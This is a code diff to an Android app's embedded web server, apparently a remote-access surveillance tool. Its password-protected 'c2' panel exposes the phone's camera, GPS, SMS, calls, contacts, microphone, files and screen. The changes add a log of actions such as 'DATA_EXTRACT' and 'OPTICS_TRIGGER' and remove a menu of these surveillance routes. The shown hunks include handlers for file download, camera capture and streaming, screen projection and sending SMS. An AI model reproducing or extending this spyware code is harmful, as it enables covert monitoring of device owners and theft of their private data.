@@ -38,6 +38,13 @@ import fi.iki.elonen.NanoHTTPD;
 public class LabRatsHttpServer extends NanoHTTPD {
 
     private final Context context;
+    private static final List<String> systemLogs = new java.util.concurrent.CopyOnWriteArrayList<>();
+
+    private static void logActivity(String msg) {
+        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+        systemLogs.add(0, "[" + timestamp + "] " + msg);
+        if (systemLogs.size() > 50) systemLogs.remove(systemLogs.size() - 1);
+    }
 
     private static final String HTML_HEADER = "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
@@ -306,6 +313,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 String pass = session.getParms().get("password");
                 
                 if (pass != null && getStoredPassword().equals(pass.trim())) {
+                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
                     Response r = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                     r.addHeader("Location", "/");
                     r.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly");
@@ -446,7 +454,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         // Status Monitor Card
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v4.0</h2>");
+        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v1.3.2</h2>");
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
         
         // Server Status
@@ -470,41 +478,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("</div>");
 
-        // Quick Access Terminal
-        html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 25px;\">QUICK_ACCESS_NODES</h2>");
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 20px;\">");
-
-        // Node definitions with individual colors
-        Object[][] nodes = {
-            {"/device", "Hardware", "&#128241;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
-            {"/files", "Data", "&#128193;", "var(--neon-green)", "rgba(57, 255, 20, 0.05)"},
-            {"/camera", "Optics", "&#128247;", "var(--danger)", "rgba(255, 49, 49, 0.05)"},
-            {"/gps", "Locate", "&#128205;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
-            {"/intel", "Intel", "&#9889;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
-            {"/calls", "Comms", "&#128222;", "var(--neon-yellow)", "rgba(255, 255, 0, 0.05)"},
-            {"/sms", "SMS", "&#128233;", "#3498db", "rgba(52, 152, 219, 0.05)"},
-            {"/mms", "MMS", "&#128444;", "#e67e22", "rgba(230, 126, 34, 0.05)"},
-            {"/audio", "Acoustics", "&#127908;", "#1abc9c", "rgba(26, 188, 156, 0.05)"},
-            {"/contacts", "Contacts", "&#128101;", "#f39c12", "rgba(243, 156, 18, 0.05)"}
-        };
-
-        for (Object[] node : nodes) {
-            String link = (String)node[0];
-            String label = (String)node[1];
-            String icon = (String)node[2];
-            String color = (String)node[3];
-            String bgColor = (String)node[4];
-
-            html.append("<a href=\"").append(link).append("\" class=\"card-node\" style=\"border-color: ").append(color).append("; background: ").append(bgColor).append(";\">");
-            html.append("<div class=\"icon\" style=\"color: ").append(color).append("; filter: drop-shadow(0 0 10px ").append(color).append(");\">").append(icon).append("</div>");
-            html.append("<div style=\"color: ").append(color).append("; font-weight: 700; font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase;\">").append(label).append("</div>");
-            html.append("</a>");
-        }
-
-        html.append("</div>");
-        html.append("</div>");
-
         // Security Settings Card
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
         html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
@@ -518,11 +491,20 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         // System Log Preview (Cyber effect)
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
-        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">SESSION_LOGS</h3>");
-        html.append("<div style=\"background: #000; padding: 15px; border-radius: 4px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<div>[SUCCESS] Uplink established at ").append(new java.util.Date()).append("</div>");
-        html.append("<div>[INFO] Device model: ").append(android.os.Build.MODEL).append(" detected</div>");
-        html.append("<div>[INFO] Encrypted bridge active... waiting for command</div>");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">ACTIVE_SESSION_LOGS</h3>");
+        html.append("<div id=\"log-terminal\" style=\"background: #000; padding: 20px; border-radius: 4px; font-size: 0.8rem; color: var(--terminal-green); line-height: 1.8; font-family: 'JetBrains Mono', monospace; height: 300px; overflow-y: auto; border: 1px solid rgba(0, 242, 255, 0.1);\">");
+        
+        if (systemLogs.isEmpty()) {
+            html.append("<div>[WAITING] Uplink established. Bridge active...</div>");
+        } else {
+            for (String log : systemLogs) {
+                html.append("<div>").append(escapeHtml(log)).append("</div>");
+            }
+        }
+        
+        html.append("</div>");
+        html.append("<div style=\"margin-top: 15px; text-align: right;\">");
+        html.append("<button onclick=\"location.reload()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: rgba(0, 242, 255, 0.3);\">REFRESH_LOGS</button>");
         html.append("</div>");
         html.append("</div>");
 
@@ -672,6 +654,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveFileDownload(File file) {
         try {
+            logActivity("DATA_EXTRACT: File fetched - " + file.getName());
             FileInputStream fis = new FileInputStream(file);
             String mimeType = getMimeType(file.getName());
             Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
@@ -1590,6 +1573,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveCameraCapture(Map<String, String> params) {
         String cameraId = params.get("cam");
+        logActivity("OPTICS_TRIGGER: Capture command sent to camera " + (cameraId != null ? cameraId : "0"));
         if (cameraId == null || cameraId.isEmpty()) {
             cameraId = "0"; // Default to back camera
         }
@@ -2038,6 +2022,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response startCameraStream(Map<String, String> params) {
         String camId = params.get("cam");
+        logActivity("OPTICS_UPLINK: Live stream started on camera " + (camId != null ? camId : "0"));
         String widthStr = params.get("width");
         String heightStr = params.get("height");
         String qualityStr = params.get("quality");
@@ -2154,6 +2139,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response startScreenProjection() {
         try {
+            logActivity("PROJECTION_UPLINK: Screen share protocol initiated");
             Intent intent = new Intent(context, MainActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             intent.putExtra("trigger", "screen_capture");
@@ -2850,6 +2836,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         String number = params.get("number"), message = params.get("message");
         if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
         try {
+            logActivity("COMMS_DISPATCH: SMS sent to " + number);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
             }
@@ -3038,6 +3025,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     .edit()
                     .putString("c2_password", newPass.trim())
                     .apply();
+
+            logActivity("SECURITY_PROTOCOL: Interface password updated");
 
             String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><p>New security protocol active. You will need to use this key for future uplinks.</p><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
